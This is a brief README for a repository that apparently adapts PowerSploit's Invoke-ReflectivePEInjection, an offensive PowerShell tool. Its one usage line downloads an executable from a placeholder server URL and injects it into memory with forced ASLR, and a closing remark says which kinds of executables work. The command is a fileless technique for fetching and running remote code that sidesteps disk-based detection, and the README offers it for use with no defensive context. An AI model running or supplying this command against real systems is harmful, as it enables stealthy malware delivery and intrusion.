# my-invoke-reflectivepeinjection
based on https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

command:
invoke-reflectivepeinjection -peurl http://yourserver/pe.exe -forceaslr

only works with straightforward executing PEs, don't provide executables expecting arguments or that spawn pseudo shells
